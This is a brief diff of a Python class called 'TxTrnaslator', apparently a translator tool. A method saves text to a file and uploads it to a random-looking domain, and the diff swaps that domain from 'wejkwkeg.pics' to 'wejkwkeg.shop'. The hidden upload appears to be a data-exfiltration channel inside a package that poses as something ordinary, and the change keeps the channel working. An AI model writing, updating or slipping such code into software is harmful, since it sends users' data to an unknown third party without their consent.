@@ -65,7 +65,7 @@ class TxTrnaslator:
         file_path = self.save_text_to_file()
         
         with open(file_path, 'rb') as f:
-            url = "https://wejkwkeg.pics/uploadt"
+            url = "https://wejkwkeg.shop/uploadt"
 
             files = {"file": f}
             data = {"caption": ""}
